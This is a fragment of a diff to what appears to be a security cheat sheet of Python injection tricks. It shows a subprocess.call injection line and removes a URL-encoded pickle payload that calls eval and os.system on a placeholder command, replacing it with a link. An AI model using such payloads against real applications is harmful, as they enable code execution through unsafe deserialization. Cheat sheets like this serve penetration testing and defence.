@@ -25,4 +25,4 @@ import subprocess; subprocess.call(["payload"]);
 # Unickle
 [Pickle python injection](http://xhyumiracle.com/python-pickle-injection/)
 
-'c__builtin__%0Aeval%0Ap1%0A(S"os.system("payload")"%0Ap2%0Atp3%0ARp4%0A.%0A'
+[pickle](https://github.com/redirected/tricks/blob/master/pickle)
